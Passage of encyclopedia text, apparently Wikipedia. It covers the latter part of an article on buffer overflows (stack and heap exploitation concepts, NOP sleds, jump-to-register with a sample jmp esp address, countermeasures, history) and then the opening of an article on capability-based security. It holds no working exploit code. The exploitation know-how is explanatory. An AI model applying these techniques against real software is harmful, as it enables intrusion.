'e'


's'


's'


'i'


'v'




25856






hex



65


78


63


65


73


73


69


76




65


00




B's value has now been inadvertently replaced by a number formed from part of the character string. In this example "e" followed by a zero byte would become 25856.

Writing data past the end of allocated memory can sometimes be detected by the operating system to generate a 
segmentation fault
 error that terminates the process.

To prevent the buffer overflow from happening in this example, the call to 
strcpy
 could be replaced with 
strlcpy
, which takes the maximum capacity of A (including a null-termination character) as an additional parameter and ensures that no more than this amount of data is written to A:



strlcpy
(
A
,
 
"excessive"
,
 
sizeof
(
A
));




When available, the 
strlcpy
 library function is preferred over 
strncpy
 which does not null-terminate the destination buffer if the source string's length is greater than or equal to the size of the buffer (the third argument passed to the function). Therefore 
A
 may not be null-terminated and cannot be treated as a valid C-style string.



Exploitation
[
edit
]


The techniques to 
exploit
 a buffer overflow vulnerability vary by 
architecture
, 
operating system
, and memory region. For example, exploitation on the 
heap
 (used for dynamically allocated memory), differs markedly from exploitation on the 
call stack
. In general, heap exploitation depends on the heap manager used on the target system, while stack exploitation depends on the calling convention used by the architecture and compiler.



Stack-based exploitation
[
edit
]


Main article: 
Stack buffer overflow


There are several ways in which one can manipulate a program by exploiting stack-based buffer overflows:



Changing program behavior by overwriting a local variable located near the vulnerable buffer on the stack;


By overwriting the return address in a 
stack frame
 to point to code selected by the attacker, usually called the 
shellcode
. Once the function returns, execution will resume at the attacker's shellcode;


By overwriting a 
function pointer
[
2
]
 or 
exception handler
 to point to the shellcode, which is subsequently executed;


By overwriting a local variable (or pointer) of a different stack frame, which will later be used by the function that owns that frame.
[
3
]


The attacker designs data to cause one of these exploits, then places this data in a buffer supplied to users by the vulnerable code. If the address of the user-supplied data used to affect the stack buffer overflow is unpredictable, exploiting a stack buffer overflow to cause remote code execution becomes much more difficult. One technique that can be used to exploit such a buffer overflow is called "
trampolining
". Here, an attacker will find a pointer to the vulnerable stack buffer and compute the location of their 
shellcode
 relative to that pointer. The attacker will then use the overwrite to jump to an 
instruction
 already in memory which will make a second jump, this time relative to the pointer. That second jump will branch execution into the shellcode. Suitable instructions are often present in large code. The 
Metasploit Project
, for example, maintains a database of suitable opcodes, though it lists only those found in the 
Windows
 operating system.
[
4
]




Heap-based exploitation
[
edit
]


Main article: 
Heap overflow


A buffer overflow occurring in the heap data area is referred to as a heap overflow and is exploitable in a manner different from that of stack-based overflows. Memory on the heap is dynamically allocated by the application at run-time and typically contains program data. Exploitation is performed by corrupting this data in specific ways to cause the application to overwrite internal structures such as linked list pointers. The canonical heap overflow technique overwrites dynamic memory allocation linkage (such as 
malloc
 meta data) and uses the resulting pointer exchange to overwrite a program function pointer.

Microsoft
's 
GDI+
 vulnerability in handling 
JPEGs
 is an example of the danger a heap overflow can present.
[
5
]




Barriers to exploitation
[
edit
]


Manipulation of the buffer, which occurs before it is read or executed, may lead to the failure of an exploitation attempt. These manipulations can mitigate the threat of exploitation, but may not make it impossible. Manipulations could include conversion to upper or lower case, removal of 
metacharacters
 and filtering out of non-
alphanumeric
 strings. However, techniques exist to bypass these filters and manipulations, such as 
alphanumeric shellcode
, 
polymorphic code
, 
self-modifying code
, and 
return-to-libc attacks
. The same methods can be used to avoid detection by 
intrusion detection systems
. In some cases, including where code is converted into 
Unicode
,
[
6
]
 the threat of the vulnerability has been misrepresented by the disclosers as only Denial of Service when in fact the remote execution of arbitrary code is possible.



Practicalities of exploitation
[
edit
]


In real-world exploits there are a variety of challenges which need to be overcome for exploits to operate reliably. These factors include null bytes in addresses, variability in the location of shellcode, differences between environments, and various counter-measures in operation.



NOP sled technique
[
edit
]


Main article: 
NOP slide


Illustration of a NOP-sled payload on the stack.


A NOP-sled is the oldest and most widely known technique for exploiting stack buffer overflows.
[
7
]
 It solves the problem of finding the exact address of the buffer by effectively increasing the size of the target area. To do this, much larger sections of the stack are corrupted with the 
no-op
 machine instruction. At the end of the attacker-supplied data, after the no-op instructions, the attacker places an instruction to perform a relative jump to the top of the buffer where the 
shellcode
 is located. This collection of no-ops is referred to as the "NOP-sled" because if the return address is overwritten with any address within the no-op region of the buffer, the execution will "slide" down the no-ops until it is redirected to the actual malicious code by the jump at the end. This technique requires the attacker to guess where on the stack the NOP-sled is instead of the comparatively small shellcode.
[
8
]


Because of the popularity of this technique, many vendors of 
intrusion prevention systems
 will search for this pattern of no-op machine instructions in an attempt to detect shellcode in use. A NOP-sled does not necessarily contain only traditional no-op machine instructions. Any instruction that does not corrupt the machine state to a point where the shellcode will not run can be used in place of the hardware assisted no-op. As a result, it has become common practice for exploit writers to compose the no-op sled with randomly chosen instructions which will have no real effect on the shellcode execution.
[
9
]


While this method greatly improves the chances that an attack will be successful, it is not without problems. Exploits using this technique still must rely on some amount of luck that they will guess offsets on the stack that are within the NOP-sled region.
[
10
]
 An incorrect guess will usually result in the target program crashing and could alert the 
system administrator
 to the attacker's activities. Another problem is that the NOP-sled requires a much larger amount of memory in which to hold a NOP-sled large enough to be of any use. This can be a problem when the allocated size of the affected buffer is too small and the current depth of the stack is shallow (i.e., there is not much space from the end of the current stack frame to the start of the stack). Despite its problems, the NOP-sled is often the only method that will work for a given platform, environment, or situation, and as such it is still an important technique.



The jump to address stored in a register technique
[
edit
]

The "jump to register" technique allows for reliable exploitation of stack buffer overflows without the need for extra room for a NOP-sled and without having to guess stack offsets. The strategy is to overwrite the return pointer with something that will cause the program to jump to a known pointer stored within a register which points to the controlled buffer and thus the shellcode. For example, if register A contains a pointer to the start of a buffer then any jump or call taking that register as an operand can be used to gain control of the flow of execution.
[
11
]
 
An instruction from ntdll.dll to call the 
DbgPrint()
 routine contains the 
i386
 machine opcode for 
jmp esp
.


In practice a program may not intentionally contain instructions to jump to a particular register. The traditional solution is to find an unintentional instance of a suitable 
opcode
 at a fixed location somewhere within the program memory. Figure 
E
 on the left contains an example of such an unintentional instance of the i386 
jmp esp
 instruction. The opcode for this instruction is 
FF E4
.
[
12
]
 This two-byte sequence can be found at a one-byte offset from the start of the instruction 
call DbgPrint
 at address 
0x7C941EED
. If an attacker overwrites the program return address with this address the program will first jump to 
0x7C941EED
, interpret the opcode 
FF E4
 as the 
jmp esp
 instruction, and will then jump to the top of the stack and execute the attacker's code.
[
13
]


When this technique is possible the severity of the vulnerability increases considerably. This is because exploitation will work reliably enough to automate an attack with a virtual guarantee of success when it is run. For this reason, this is the technique most commonly used in 
Internet worms
 that exploit stack buffer overflow vulnerabilities.
[
14
]


This method also allows shellcode to be placed after the overwritten return address on the Windows platform. Since executables are mostly based at address 
0x00400000
 and x86 is a 
little endian
 architecture, the last byte of the return address must be a null, which terminates the buffer copy and nothing is written beyond that. This limits the size of the shellcode to the size of the buffer, which may be overly restrictive. DLLs are located in high memory (above 
0x01000000
) and so have addresses containing no null bytes, so this method can remove null bytes (or other disallowed characters) from the overwritten return address. Used in this way, the method is often referred to as "DLL trampolining".



Protective countermeasures
[
edit
]


Various techniques have been used to detect or prevent buffer overflows, with various tradeoffs. The following sections describe the choices and implementations available.



Choice of programming language
[
edit
]


Assembly, C, and C++ are popular programming languages that are vulnerable to buffer overflow in part because they allow direct access to memory and are not 
strongly typed
.
[
15
]
 C provides no built-in protection against accessing or overwriting data in any part of memory. More specifically, it does not check that data written to a buffer is within the boundaries of that buffer. The standard C++ libraries provide many ways of safely buffering data, and C++'s 
Standard Template Library
 (STL) provides containers that can optionally perform bounds checking if the programmer explicitly calls for checks while accessing data. For example, a 
vector
's member function 
at()
 performs a bounds check and throws an 
out_of_range
 
exception
 if the bounds check fails.
[
16
]
 However, C++ behaves just like C if the bounds check is not explicitly called. Techniques to avoid buffer overflows also exist for C.

Languages that are strongly typed and do not allow direct memory access, such as COBOL, Java, Eiffel, Python, and others, prevent buffer overflow in most cases.
[
15
]
 Many programming languages other than C or C++ provide runtime checking and in some cases even compile-time checking which might send a warning or raise an exception, while C or C++ would overwrite data and continue to execute instructions until erroneous results are obtained, potentially causing the program to crash. Examples of such languages include 
Ada
, 
Eiffel
, 
Lisp
, 
Modula-2
, 
Smalltalk
, 
OCaml
 and such C-derivatives as 
Cyclone
, 
Rust
 and 
D
. The 
Java
 and 
.NET Framework
 bytecode environments also require bounds checking on all arrays. Nearly every 
interpreted language
 will protect against buffer overflow, signaling a well-defined error condition. Languages that provide enough type information to do bounds checking often provide an option to enable or disable it. 
Static code analysis
 can remove many dynamic bound and type checks, but poor implementations and awkward cases can significantly decrease performance. Software engineers should carefully consider the tradeoffs of safety versus performance costs when deciding which language and compiler setting to use.



Use of safe libraries
[
edit
]


The problem of buffer overflows is common in the C and C++ languages because they expose low level representational details of buffers as containers for data types. Buffer overflows can be avoided by maintaining a high degree of correctness in code that performs buffer management. It has also long been recommended to avoid standard library functions that are not bounds checked, such as 
gets
, 
scanf
 and 
strcpy
. The 
Morris worm
 exploited a 
gets
 call in 
fingerd
.
[
17
]


Well-written and tested abstract data type libraries that centralize and automatically perform buffer management, including bounds checking, can reduce the occurrence and impact of buffer overflows. The primary data types in languages in which buffer overflows are common are strings and arrays. Thus, libraries preventing buffer overflows in these data types can provide the vast majority of the necessary coverage. However, failure to use these safe libraries correctly can result in buffer overflows and other vulnerabilities, and naturally any 
bug
 in the library is also a potential vulnerability. "Safe" library implementations include "The Better String Library",
[
18
]
 Vstr
[
19
]
 and Erwin.
[
20
]
 The 
OpenBSD
 operating system's 
C library
 provides the 
strlcpy
 and 
strlcat
 functions, but these are more limited than full safe library implementations.

In September 2007, Technical Report 24731, prepared by the C standards committee, was published.
[
21
]
 It specifies a set of functions that are based on the standard C library's string and IO functions, with additional buffer-size parameters. However, the efficacy of these functions for reducing buffer overflows is disputable. They require programmer intervention on a per function call basis that is equivalent to intervention that could make the analogous older standard library functions buffer overflow safe.
[
22
]




Buffer overflow protection
[
edit
]


Main article: 
Buffer overflow protection


Buffer overflow protection is used to detect the most common buffer overflows by checking that the 
stack
 has not been altered when a function returns. If it has been altered, the program exits with a 
segmentation fault
. Three such systems are Libsafe,
[
23
]
 and the 
StackGuard
[
24
]
 and 
ProPolice
[
25
]
 
gcc
 patches.

Microsoft's implementation of 
Data Execution Prevention
 (DEP) mode explicitly protects the pointer to the 
Structured Exception Handler
 (SEH) from being overwritten.
[
26
]


Stronger stack protection is possible by splitting the stack in two: one for data and one for function returns. This split is present in the 
Forth language
, though it was not a security-based design decision. Regardless, this is not a complete solution to buffer overflows, as sensitive data other than the return address may still be overwritten.

This type of protection is also not entirely accurate because it does not detect all attacks. Systems like StackGuard are more centered around the behavior of the attacks, which makes them efficient and faster in comparison to range-check systems.
[
27
]




Pointer protection
[
edit
]


Buffer overflows work by manipulating 
pointers
, including stored addresses. PointGuard was proposed as a compiler-extension to prevent attackers from reliably manipulating pointers and addresses.
[
28
]
 The approach works by having the compiler add code to automatically XOR-encode pointers before and after they are used. Theoretically, because the attacker does not know what value will be used to encode and decode the pointer, one cannot predict what the pointer will point to if it is overwritten with a new value. PointGuard was never released, but Microsoft implemented a similar approach beginning in 
Windows XP
 SP2 and 
Windows Server 2003
 SP1.
[
29
]
 Rather than implement pointer protection as an automatic feature, Microsoft added an API routine that can be called. This allows for better performance (because it is not used all of the time), but places the burden on the programmer to know when its use is necessary.

Because XOR is linear, an attacker may be able to manipulate an encoded pointer by overwriting only the lower bytes of an address. This can allow an attack to succeed if the attacker can attempt the exploit multiple times or complete an attack by causing a pointer to point to one of several locations (such as any location within a NOP sled).
[
30
]
 Microsoft added a random rotation to their encoding scheme to address this weakness to partial overwrites.
[
31
]




Executable space protection
[
edit
]


Main article: 
Executable space protection


Executable space protection is an approach to buffer overflow protection that prevents execution of code on the stack or the heap. An attacker may use buffer overflows to insert arbitrary code into the memory of a program, but with executable space protection, any attempt to execute that code will cause an exception.

Some CPUs support a feature called 
NX
 ("No eXecute") or 
XD
 ("eXecute Disabled") bit, which in conjunction with software, can be used to mark 
pages of data
 (such as those containing the stack and the heap) as readable and writable but not executable.

Some Unix operating systems (e.g. 
OpenBSD
, 
macOS
) ship with executable space protection (e.g. 
W^X
). Some optional packages include:



PaX
[
32
]


Exec Shield
[
33
]


Openwall
[
34
]


Newer variants of Microsoft Windows also support executable space protection, called 
Data Execution Prevention
.
[
35
]
 
Proprietary
 add-ons include:



BufferShield
[
36
]


StackDefender
[
37
]


Executable space protection does not generally protect against 
return-to-libc attacks
, or any other attack that does not rely on the execution of the attackers code. However, on 
64-bit
 systems using 
ASLR
, as described below, executable space protection makes it far more difficult to execute such attacks.



Address space layout randomization
[
edit
]


Main article: 
Address space layout randomization


Address space layout randomization (ASLR) is a computer security feature that involves arranging the positions of key data areas, usually including the base of the executable and position of libraries, heap, and stack, randomly in a process' address space.

Randomization of the 
virtual memory
 addresses at which functions and variables can be found can make exploitation of a buffer overflow more difficult, but not impossible. It also forces the attacker to tailor the exploitation attempt to the individual system, which foils the attempts of 
internet worms
.
[
38
]
 A similar but less effective method is to 
rebase
 processes and libraries in the virtual address space.



Deep packet inspection
[
edit
]


Main article: 
Deep packet inspection


The use of deep packet inspection (DPI) can detect, at the network perimeter, very basic remote attempts to exploit buffer overflows by use of attack signatures and 
heuristics
. This technique can block packets that have the signature of a known attack. It was formerly used in situations in which a long series of No-Operation instructions (known as a NOP-sled) was detected and the location of the exploit's 
payload
 was slightly variable.

Packet scanning is not an effective method since it can only prevent known attacks and there are many ways that a NOP-sled can be encoded. 
Shellcode
 used by attackers can be made 
alphanumeric
, 
metamorphic
, or 
self-modifying
 to evade detection by heuristic packet scanners and 
intrusion detection systems
.



Testing
[
edit
]


Checking for buffer overflows and patching the bugs that cause them helps prevent buffer overflows. One common automated technique for discovering them is 
fuzzing
.
[
39
]
 Edge case testing can also uncover buffer overflows, as can static analysis.
[
40
]
 Once a potential buffer overflow is detected it should be patched. This makes the testing approach useful for software that is in development, but less useful for legacy software that is no longer maintained or supported.



History
[
edit
]


Buffer overflows were understood and partially publicly documented as early as 1972, when the Computer Security Technology Planning Study laid out the technique: "The code performing this function does not check the source and destination addresses properly, permitting portions of the monitor to be overlaid by the user. This can be used to inject code into the monitor that will permit the user to seize control of the machine."
[
41
]
 Today, the monitor would be referred to as the kernel.

The earliest documented hostile exploitation of a buffer overflow was in 1988. It was one of several exploits used by the 
Morris worm
 to propagate itself over the Internet. The program exploited was a 
service
 on 
Unix
 called 
finger
.
[
42
]
 Later, in 1995, Thomas Lopatic independently rediscovered the buffer overflow and published his findings on the 
Bugtraq
 security mailing list.
[
43
]
 A year later, in 1996, 
Elias Levy
 (also known as Aleph One) published in 
Phrack
 magazine the paper "Smashing the Stack for Fun and Profit",
[
44
]
 a step-by-step introduction to exploiting stack-based buffer overflow vulnerabilities.

Since then, at least two major internet worms have exploited buffer overflows to compromise a large number of systems. In 2001, the 
Code Red worm
 exploited a buffer overflow in Microsoft's 
Internet Information Services
 (IIS) 5.0
[
45
]
 and in 2003 the 
SQL Slammer
 worm compromised machines running 
Microsoft SQL Server 2000
.
[
46
]


In 2003, buffer overflows present in licensed 
Xbox
 games have been exploited to allow unlicensed software, including 
homebrew games
, to run on the console without the need for hardware modifications, known as 
modchips
.
[
47
]
 The 
PS2 Independence Exploit
 also used a buffer overflow to achieve the same for the 
PlayStation 2
. The Twilight hack accomplished the same with the 
Wii
, using a buffer overflow in 
The Legend of Zelda: Twilight Princess
.



See also
[
edit
]




Billion laughs


Buffer over-read


Coding conventions


Computer security


End-of-file


Heap overflow


Ping of death


Port scanner


Return-to-libc attack


Safety-critical system


Security-focused operating system


Self-modifying code


Software quality


Shellcode


Stack buffer overflow


Uncontrolled format string




References
[
edit
]






^
 
R. Shirey (August 2007). 
Internet Security Glossary, Version 2
. Network Working Group. 
doi
:
10.17487/RFC4949
. 
RFC
 
4949
.
 
Informational.






^
 
"CORE-2007-0219: OpenBSD's IPv6 mbufs remote kernel buffer overflow"
. Retrieved 
2007-05-15
.




^
 
"Modern Overflow Targets"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 2022-10-09
. Retrieved 
2013-07-05
.




^
 
"The Metasploit Opcode Database"
. Archived from 
the original
 on 12 May 2007
. Retrieved 
2007-05-15
.




^
 
"Microsoft Technet Security Bulletin MS04-028"
. 
Microsoft
. Archived from 
the original
 on 2011-08-04
. Retrieved 
2007-05-15
.




^
 
"Creating Arbitrary Shellcode In Unicode Expanded Strings"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 2006-01-05
. Retrieved 
2007-05-15
.




^
 
Vangelis (2004-12-08). 
"Stack-based Overflow Exploit: Introduction to Classical and Advanced Overflow Technique"
. Wowhacker via Neworder. Archived from 
the original
 
(text)
 on August 18, 2007.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
Balaban, Murat. 
"Buffer Overflows Demystified"
 
(text)
. Enderunix.org.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
Akritidis, P.; Evangelos P. Markatos; M. Polychronakis; Kostas D. Anagnostakis (2005). 
"STRIDE: Polymorphic Sled Detection through Instruction Sequence Analysis."
 
(PDF)
. 
Proceedings of the 20th IFIP International Information Security Conference (IFIP/SEC 2005)
. IFIP International Information Security Conference. Archived from 
the original
 
(PDF)
 on 2012-09-01
. Retrieved 
2012-03-04
.




^
 
Klein, Christian (September 2004). 
"Buffer Overflow"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 2007-09-28.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
Shah, Saumil (2006). 
"Writing Metasploit Plugins: from vulnerability to exploit"
 
(PDF)
. 
Hack In The Box
. Kuala Lumpur
. Retrieved 
2012-03-04
.




^
 
Intel 64 and IA-32 Architectures Software Developer's Manual Volume 2A: Instruction Set Reference, A-M
 
(PDF)
. Intel Corporation. May 2007. pp. 3–508. Archived from 
the original
 
(PDF)
 on 2007-11-29.




^
 
Alvarez, Sergio (2004-09-05). 
"Win32 Stack BufferOverFlow Real Life Vuln-Dev Process"
 
(PDF)
. IT Security Consulting
. Retrieved 
2012-03-04
.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 


Ukai, Yuji; Soeder, Derek; Permeh, Ryan (2004). 
"Environment Dependencies in Windows Exploitation"
. 
BlackHat Japan
. Japan: eEye Digital Security
. Retrieved 
2012-03-04
.




^ 
a
 
b
 
https://www.owasp.org/index.php/Buffer_OverflowsBuffer
 Overflows article on OWASP 
Archived
 2016-08-29 at the 
Wayback Machine




^
 
"vector::at - C++ Reference"
. Cplusplus.com
. Retrieved 
2014-03-27
.




^
 
"Archived copy"
. 
wiretap.area.com
. Archived from 
the original
 on 5 May 2001
. Retrieved 
6 June
 2022
.
{{
cite web
}}
:  CS1 maint: archived copy as title (
link
)




^
 
"The Better String Library"
.




^
 
"The Vstr Homepage"
. Archived from 
the original
 on 2017-03-05
. Retrieved 
2007-05-15
.




^
 
"The Erwin Homepage"
. Retrieved 
2007-05-15
.




^
 
International Organization for Standardization (2007). 
"Information technology – Programming languages, their environments and system software interfaces – Extensions to the C library – Part 1: Bounds-checking interfaces"
. 
ISO Online Browsing Platform
.




^
 
"CERT Secure Coding Initiative"
. Archived from 
the original
 on December 28, 2012
. Retrieved 
2007-07-30
.




^
 
"Libsafe at FSF.org"
. Retrieved 
2007-05-20
.




^
 
"StackGuard: Automatic Adaptive Detection and Prevention of Buffer-Overflow Attacks by Cowan et al"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 2022-10-09
. Retrieved 
2007-05-20
.




^
 
"ProPolice at X.ORG"
. Archived from 
the original
 on 12 February 2007
. Retrieved 
2007-05-20
.




^
 
"Bypassing Windows Hardware-enforced Data Execution Prevention"
. Archived from 
the original
 on 2007-04-30
. Retrieved 
2007-05-20
.




^
 
Lhee, Kyung-Suk; Chapin, Steve J. (2003-04-25). 
"Buffer overflow and format string overflow vulnerabilities"
. 
Software: Practice and Experience
. 
33
 (5): 423–460. 
doi
:
10.1002/spe.515
. 
ISSN
 
0038-0644
.




^
 
"12th USENIX Security Symposium – Technical Paper"
. 
www.usenix.org
. Retrieved 
3 April
 2018
.




^
 
"Protecting against Pointer Subterfuge (Kinda!)"
. 
msdn.com
. Archived from 
the original
 on 2010-05-02
. Retrieved 
3 April
 2018
.




^
 
"USENIX - The Advanced Computing Systems Association"
 
(PDF)
. 
www.usenix.org
. 
Archived
 
(PDF)
 from the original on 2022-10-09
. Retrieved 
3 April
 2018
.




^
 
"Protecting against Pointer Subterfuge (Redux)"
. 
msdn.com
. Archived from 
the original
 on 2009-12-19
. Retrieved 
3 April
 2018
.




^
 
"PaX: Homepage of the PaX team"
. Retrieved 
2007-06-03
.




^
 
"KernelTrap.Org"
. Archived from 
the original
 on 2012-05-29
. Retrieved 
2007-06-03
.




^
 
"Openwall Linux kernel patch 2.4.34-ow1"
. Archived from 
the original
 on 2012-02-19
. Retrieved 
2007-06-03
.




^
 
"Microsoft Technet: Data Execution Prevention"
. Archived from 
the original
 on 2006-06-22
. Retrieved 
2006-06-30
.




^
 
"BufferShield: Prevention of Buffer Overflow Exploitation for Windows"
. Retrieved 
2007-06-03
.




^
 
"NGSec Stack Defender"
. Archived from 
the original
 on 2007-05-13
. Retrieved 
2007-06-03
.




^
 
"PaX at GRSecurity.net"
. Retrieved 
2007-06-03
.




^
 
"The Exploitant - Security info and tutorials"
. Retrieved 
2009-11-29
.




^
 
Larochelle, David; Evans, David (13 August 2001). 
"Statically Detecting Likely Buffer Overflow Vulnerabilities"
. 
USENIX Security Symposium
. 
32
.




^
 
"Computer Security Technology Planning Study"
 
(PDF)
. p. 61. Archived from 
the original
 
(PDF)
 on 2011-07-21
. Retrieved 
2007-11-02
.




^
 
"
"A Tour of The Worm" by Donn Seeley, University of Utah"
. Archived from 
the original
 on 2007-05-20
. Retrieved 
2007-06-03
.




^
 
"Bugtraq security mailing list archive"
. Archived from 
the original
 on 2007-09-01
. Retrieved 
2007-06-03
.




^
 
"
"Smashing the Stack for Fun and Profit" by Aleph One"
. Retrieved 
2012-09-05
.




^
 
"eEye Digital Security"
. Archived from 
the original
 on 2009-06-20
. Retrieved 
2007-06-03
.




^
 
"Microsoft Technet Security Bulletin MS02-039"
. 
Microsoft
. Archived from 
the original
 on 2008-03-07
. Retrieved 
2007-06-03
.




^
 
"Hacker breaks Xbox protection without mod-chip"
. Archived from 
the original
 on 2007-09-27
. Retrieved 
2007-06-03
.






External links
[
edit
]


"Discovering and exploiting a remote buffer overflow vulnerability in an FTP server"
 by Raykoid666


"Smashing the Stack for Fun and Profit"
 by Aleph One


Gerg, Isaac (2005-05-02). 
"An Overview and Example of the Buffer-Overflow Exploit"
 
(PDF)
. 
IAnewsletter
. 
7
 (4). 
Information Assurance Technology Analysis Center
: 16–21. Archived from 
the original
 
(PDF)
 on 2006-09-27
. Retrieved 
2019-03-17
.


CERT Secure Coding Standards


CERT Secure Coding Initiative


Secure Coding in C and C++


SANS: inside the buffer overflow attack


"Advances in adjacent memory overflows"
 by Nomenumbra


A Comparison of Buffer Overflow Prevention Implementations and Weaknesses


More Security Whitepapers about Buffer Overflows


Chapter 12: Writing Exploits III
 from 
Sockets, Shellcode, Porting & Coding: Reverse Engineering Exploits and Tool Coding for Security Professionals
 by James C. Foster (
ISBN
 
1-59749-005-9
). Detailed explanation of how to use Metasploit to develop a buffer overflow exploit from scratch.


Computer Security Technology Planning Study
, James P. Anderson, ESD-TR-73-51, ESD/AFSC, Hanscom AFB, Bedford, MA 01731 (October 1972) [NTIS AD-758 206]


"Buffer Overflows: Anatomy of an Exploit"
 by Nevermore


Secure Programming with GCC and GLibc
 
Archived
 2008-11-21 at the 
Wayback Machine
 (2008), by Marcel Holtmann


"Criação de Exploits com Buffer Overflor – Parte 0 – Um pouco de teoria "
 (2018), by Helvio Junior (M4v3r1ck)


v
t
e
Memory management


Memory management as a function of an operating system


Hardware


Memory management unit
 (MMU)


Translation lookaside buffer
 (TLB)


Input–output memory management unit
 (IOMMU)


Virtual memory


Demand paging


Memory paging


Page table


Virtual memory compression


Memory segmentation


Protected mode


Real mode


Virtual 8086 mode


x86 memory segmentation


Memory allocator


dlmalloc


Hoard


jemalloc


libumem


mimalloc


ptmalloc


Manual memory management


Static memory allocation


C dynamic memory allocation


new and delete (C++)


Garbage collection


Automatic Reference Counting


Boehm garbage collector


Cheney's algorithm


Concurrent mark sweep collector


Finalizer


Garbage


Garbage-first collector


Mark–compact algorithm


Reference counting


Tracing garbage collection


Strong reference


Weak reference


Memory safety


Buffer overflow


Buffer over-read


Dangling pointer


Stack overflow


Issues


Fragmentation


Memory leak


Unreachable memory


Other


Automatic variable


International Symposium on Memory Management


Region-based memory management




 
Memory management


 
Virtual memory


 
Automatic memory management


 
Memory management algorithms


 
Memory management software




Authority control databases
: National 
Germany










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Buffer_overflow&oldid=1235066835
"


Categories
: 
Software bugs
Computer memory
Computer security exploits
Hidden categories: 
CS1 errors: missing periodical
Webarchive template wayback links
CS1 maint: archived copy as title
Articles with short description
Short description is different from Wikidata
Articles with example C code











From Wikipedia, the free encyclopedia






Computer safety concept


Capability-based security
 is a concept in the design of 
secure computing
 systems, one of the existing 
security models
. A 
capability
 (known in some systems as a 
key
) is a communicable, unforgeable 
token
 of authority. It refers to a value that 
references
 an 
object
 along with an associated set of 
access rights
. A 
user
 
program
 on a 
capability-based operating system
 must use a capability to access an object. Capability-based security refers to the principle of designing user programs such that they directly share capabilities with each other according to the 
principle of least privilege
, and to the operating system infrastructure necessary to make such transactions efficient and secure. Capability-based security is to be contrasted with an approach that uses 
traditional UNIX permissions
 and 
Access Control Lists
.

Although most operating systems implement a facility which resembles capabilities, they typically do not provide enough support to allow for the exchange of capabilities among possibly mutually untrusting entities to be the primary means of granting and distributing access rights throughout the system. A capability-based system, in contrast, is designed with that goal in mind.





Introduction
[
edit
]


Capabilities achieve their objective of improving system security by being used in place of forgeable 
references
. A forgeable reference (for example, a 
path name
) identifies an object, but does not specify which access rights are appropriate for that object and the user program which holds that reference. Consequently, any attempt to access the referenced object must be validated by the operating system, based on the 
ambient authority
 of the requesting program, typically via the use of an 
access-control list
 (ACL). Instead, in a system with capabilities, the mere fact that a user program possesses that capability entitles it to use the referenced object in accordance with the rights that are specified by that capability. In theory, a system with capabilities removes the need for any access control list or similar mechanism by giving all entities all and only the capabilities they will actually need.

A capability is typically implemented as a 
privileged
 
data structure
 that consists of a section that specifies access rights, and a section that uniquely identifies the object to be accessed. The user does not access the data structure or object directly, but instead via a 
handle
. In practice, it is used much like a 
file descriptor
 in a traditional operating system (a traditional handle), but to access every object on the system. Capabilities are typically stored by the operating system in a list, with some mechanism in place to prevent the program from directly modifying the contents of the capability (so as to forge access rights or change the object it points to). Some systems have also been based on 
capability-based addressing
 (hardware support for capabilities), such as 
Plessey System 250
.

Programs possessing capabilities can perform functions on them, such as passing them on to other programs, converting them to a less-privileged version, or deleting them. The operating system must ensure that only specific operations can occur to the capabilities in the system, in order to maintain the integrity of the security policy.

Capabilities as discussed in this article should not be confused with Portable Operating System Interface (
POSIX
) 1e/2c "
Capabilities
". The latter are coarse-grained privileges that cannot be transferred between processes.



Examples
[
edit
]


A capability is defined to be a protected 
object
 reference which, by virtue of its possession by a user process, grants that process the capability (hence the name) to interact with an object in certain ways. Those ways might include reading data associated with an object, modifying the object, executing the data in the object as a process, and other conceivable access rights. The capability logically consists of a reference that uniquely identifies a particular object and a set of one or more of these rights.

Suppose that, in a user process's memory space, there exists the following string:



/etc/passwd



Although this identifies a unique object on the system, it does not specify access rights and hence is not a capability. Suppose there is instead the following pair of values:



/etc/passwd
O_RDWR



This pair identifies an object along with a set of access rights. The pair, however, is still not a capability because the user process's 
possession
 of these values says nothing about whether that access would actually be legitimate.

Now suppose that the user program successfully executes the following statement:



int
 
fd
 
=
 
open
(
"/etc/passwd"
,
 
O_RDWR
);




The variable 
fd
 now contains the index of a file descriptor in the process's file descriptor table. This file descriptor 
is
 a capability. Its existence in the process's file descriptor table is sufficient to show that the process does indeed have legitimate access to the object. A key feature of this arrangement is that the file descriptor table is in 
kernel memory
 and cannot be directly manipulated by the user program.



Sharing between processes
[
edit
]


In traditional operating systems, programs often communicate with each other and with storage using references like those in the first two examples. Path names are often passed as command-line parameters, sent via sockets, and stored on disk. These references are not capabilities, and must be validated before they can be used. In these systems, a central question is "on whose 
authority
 is a given reference to be evaluated?" This becomes a critical issue especially for processes which must act on behalf of two different authority-bearing entities. They become susceptible to a programming error known as the 
confused deputy problem
, very frequently resulting in a 
security hole
.

In a capability-based system, the capabilities themselves are passed between processes and storage using a mechanism that is known by the operating system to maintain the integrity of those capabilities.

One novel approach to solving this problem involves the use of an 
orthogonally persistent
 operating system. In such a system, there is no need for entities to be discarded and their capabilities be invalidated, and hence require an ACL-like mechanism to restore those capabilities at a later time. The operating system maintains the integrity and security of the capabilities contained within all storage, both volatile and nonvolatile, at all times; in part by performing all 
serialization
 tasks by itself, rather than requiring user programs to do so, as is the case in most operating systems. Because user programs are relieved of this responsibility, there is no need to trust them to reproduce only legal capabilities, nor to validate requests for access using an 
access control
 mechanism. An example implementation is the 
Flex machine
 from the early 1980s.



POSIX capabilities
[
edit
]


Portable Operating System Interface (POSIX) draft 1003.1e specifies a concept of permissions called "capabilities". However, POSIX capabilities differ from capabilities in this article. A POSIX capability is not associated with any object; a process having CAP_NET_BIND_SERVICE capability can listen on any TCP port under 1024. This system is found in Linux.
[
1
]


In contrast, 
Capsicum
 Unix hybridizes a true capability-system model with a Unix design and POSIX API. Capsicum capabilities are a refined form of file descriptor, a delegable right between processes and additional object types beyond classic POSIX, such as processes, can be referenced via capabilities. In Capsicum capability mode, processes are unable to utilize global namespaces (such as the filesystem namespace) to look up objects, and must instead inherit or be delegated them. This system is found natively in FreeBSD, but patches are available to other systems.
[
2
]




Implementations
[
edit
]


